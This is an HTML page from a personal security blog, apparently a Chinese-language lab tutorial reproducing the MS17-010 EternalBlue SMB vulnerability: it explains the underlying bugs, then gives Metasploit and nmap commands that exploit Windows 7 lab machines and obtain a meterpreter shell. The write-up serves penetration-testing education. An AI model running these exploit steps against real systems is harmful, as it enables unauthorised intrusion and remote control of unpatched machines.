@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/qq.jpg">
+  <link rel="icon" type="image/png" href="/img/qq.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Personal Blog of Zhiyu Zhang">
+  <meta name="author" content="Zhiyu Zhang">
+  <meta name="keywords" content="Security, Machine Learning, Linux">
+  <title>【渗透】MS17-010漏洞复现 - Zhiyu&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/agate.min.css" />
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zhiyu's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 54vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Zhiyu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Friends
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/horse_running.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2019-11-14 19:46">
+      November 14, 2019 pm
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k words
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       minutes
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> views
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p class="note note-info">
+                
+                  Last updated on：February 16, 2026 pm
+                
+              </p>
+            
+            <article class="markdown-body">
+              <h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1 漏洞原理"></a>1 漏洞原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</strong></p>
+<p>从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的<strong>WannaCrypt</strong>，无文件的勒索软件<strong>UIWIX</strong>和SMB蠕虫<strong>EternalRocks</strong>。</p>
+<span id="more"></span>
+<h3 id="1-2-漏洞简析"><a href="#1-2-漏洞简析" class="headerlink" title="1.2 漏洞简析"></a>1.2 漏洞简析</h3><p><strong>Eternalblue利用了3个不同的bug</strong></p>
+<ul>
+<li>第一个是内核态函数<strong>srv!SrvOs2FeaListToNt</strong>在处理FEA(File Extended Attributes)转换时，由于错误地使用的<strong>WORD强制类型转换</strong>，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的<strong>缓冲区溢出</strong>。</li>
+<li>第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于<strong>后者调用的数据包是前者大小的2倍</strong>。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。</li>
+<li>一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。</li>
+</ul>
+<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2 漏洞复现"></a>2 漏洞复现</h2><h3 id="2-1-渗透Windows7-32-bit"><a href="#2-1-渗透Windows7-32-bit" class="headerlink" title="2.1 渗透Windows7 32-bit"></a>2.1 渗透Windows7 32-bit</h3><h4 id="2-1-1-实验环境"><a href="#2-1-1-实验环境" class="headerlink" title="2.1.1 实验环境"></a>2.1.1 实验环境</h4><p><strong>实验平台：</strong></p>
+<ul>
+<li>带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601<ul>
+<li><strong>IP：192.168.188.136</strong></li>
+</ul>
+</li>
+<li>Kali Linux，用于渗透<ul>
+<li><strong>IP：192.168.188.135</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>实验配置：</strong></p>
+<p>kali没有32位机器的渗透模块，我们需要做以下配置</p>
+<ul>
+<li><strong>安装wine 32</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
+dpkg --add-architecture i386
+apt-get update
+apt-get install wine32</code></pre></div>
+<ul>
+<li><strong>拉取EternalBlue_Doublepulsar攻击模块</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+
+<span class="hljs-comment"># 将模块拷贝到msf的相应目录</span>
+<span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploit
+<span class="hljs-built_in">cp</span> -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre></div>
+<ul>
+<li><strong>运行postgresql</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash">service postgresql start</code></pre></div>
+<h4 id="2-1-2-信息搜集"><a href="#2-1-2-信息搜集" class="headerlink" title="2.1.2 信息搜集"></a>2.1.2 信息搜集</h4><ul>
+<li><strong>nmap扫描</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
+namp -sS -sV -Pn 192.168.188.136</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" srcset="/img/loading.gif" alt=""></p>
+<p>发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析</p>
+<ul>
+<li><strong>查看并使用辅助扫描模块测试目标是否可攻击</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行msfconsole工具</span>
+msfconsole
+
+<span class="hljs-comment"># 搜索ms17-010相关模块，并采用辅助模块进行测试</span>
+search ms17-010
+
+<span class="hljs-comment"># 发现有一个ms17_010的扫描检测模块可用, use</span>
+use auxiliary/scanner/smb/smb_ms17_010</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" srcset="/img/loading.gif" alt=""></p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 设置RHOSTS项为192.168.188.136</span>
+<span class="hljs-built_in">set</span> RHOSTS 192.168.188.136
+
+<span class="hljs-comment"># 运行该ms17_010检测模块</span>
+run</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" srcset="/img/loading.gif" alt=""></p>
+<p><strong>发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入</strong></p>
+<h4 id="2-1-3-开始渗透"><a href="#2-1-3-开始渗透" class="headerlink" title="2.1.3 开始渗透"></a>2.1.3 开始渗透</h4><ul>
+<li><strong>尝试攻击</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用doublepulsar攻击模块</span>
+use exploit/windows/smb/eternalblue_doublepulsar
+
+<span class="hljs-comment"># 设置RHOST项为192.168.188.136</span>
+<span class="hljs-built_in">set</span> RHOST 192.168.188.136
+
+<span class="hljs-comment"># 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致</span>
+show options</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" srcset="/img/loading.gif" alt=""></p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行攻击模块</span>
+run</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" srcset="/img/loading.gif" alt=""></p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)</span>
+<span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe
+
+<span class="hljs-comment"># 再次exploit，成功</span>
+run</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" srcset="/img/loading.gif" alt=""></p>
+<p><strong>meterpreter</strong>是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读<a href="https://qgrain.github.io/2019/11/14/渗透-通过meterpreter进行提权/">【渗透】meterpreter提权</a></p>
+<h3 id="2-2-渗透Windows7-64-bit"><a href="#2-2-渗透Windows7-64-bit" class="headerlink" title="2.2 渗透Windows7 64-bit"></a>2.2 渗透Windows7 64-bit</h3><p>相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。</p>
+<p><strong><em>前几个步骤基本和渗透32位机器一致</em></strong></p>
+<h4 id="2-2-1-信息搜集"><a href="#2-2-1-信息搜集" class="headerlink" title="2.2.1 信息搜集"></a>2.2.1 信息搜集</h4><ul>
+<li><strong>nmap扫描主机信息</strong></li>
+<li><strong>msfconsole采用scanner模块扫描检测ms17-010漏洞</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010
+<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>
+show options
+run</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" srcset="/img/loading.gif" alt=""></p>
+<h4 id="2-2-2开始渗透"><a href="#2-2-2开始渗透" class="headerlink" title="2.2.2开始渗透"></a>2.2.2开始渗透</h4><ul>
+<li><strong>方法一：采用msf自带的eternalblue攻击模块</strong></li>
+</ul>
+<div class="hljs"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue
+<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>
+show options
+run</code></pre></div>
+<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" srcset="/img/loading.gif" alt=""></p>
+<p>成功拿到目标机器的Shell</p>
+<ul>
+<li><strong>方法二：采用github开源攻击模块DoublePulsar</strong></li>
+</ul>
+<p>步骤和攻击32位机器一致，但是需要配置<a href="">wine64和wine32共存</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Security/">Security</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CVE/">CVE</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Bug/">Bug</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【渗透】meterpreter命令详解</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/22/Iptables-1/">
+                        <span class="hidden-mobile">Iptables(1)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <div class="comments" id="comments">
+                
+                
+  <script type="text/javascript">
+    function loadUtterances() {
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.defer = false
+      s.setAttribute('repo', 'QGrain/QGrain.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', 'github-light');
+      s.setAttribute('crossorigin', 'anonymous');
+      var e = document.getElementsByTagName('script')[0];
+      e.parentNode.insertBefore(s, e);
+    }
+    createObserver(loadUtterances, 'comments')
+  </script>
+
+
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+    <!-- APlayer 音乐播放器 -->
+    <div id="aplayer"></div>
+    <script defer src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js" ></script>
+<link  rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
+<script type="text/javascript">
+  var oldLoadAp = window.onload;
+  window.onload = function () {
+    oldLoadAp && oldLoadAp();
+
+    new APlayer({
+      container: document.getElementById('aplayer'),
+      fixed: true,
+      autoplay: 'false' === 'true',
+      loop: 'all',
+      order: 'random',
+      theme: '#b7daff',
+      preload: 'none',
+      audio: [{"name":"Ilomilo","artist":"Billie Eilish","url":"/songs/Ilomilo-3D.mp3","cover":"/img/songs/Ilomilo.jpg"}]
+    });
+  }
+</script>
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+      <i class="iconfont icon-rss"></i>
+        <a href="https://qgrain.github.io/atom.xml" target="_blank" rel="nofollow noopener">
+          <span>RSS</span></a>
+    </div>
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            ( •̀ ω •́ )✧ 总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+<div class="text-center">
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("05/16/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "本站安全运行&nbsp"+dnum+"&nbsp天";
+      document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒, 博主很懒更新很慢ㄟ( ▔, ▔ )ㄏ";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 6,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "【渗透】MS17-010漏洞复现&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 80,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+  <script>(function (i, s, o, g, r, a, m) {
+      i['DaoVoiceObject'] = r;
+      i[r] = i[r] ||
+        function () {
+          (i[r].q = i[r].q || []).push(arguments);
+        };
+      i[r].l = 1 * new Date();
+      a = s.createElement(o);
+      m = s.getElementsByTagName(o)[0];
+      a.async = 1;
+      a.src = g;
+      a.charset = 'utf-8';
+      m.parentNode.insertBefore(a, m);
+    })(window, document, 'script', ('https:' === document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/2bbf5718.js", 'daovoice');
+    daovoice('init', {
+      app_id: "2bbf5718",
+    });
+    daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+          (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+          m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+      ga('create', 'UA-187967588-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
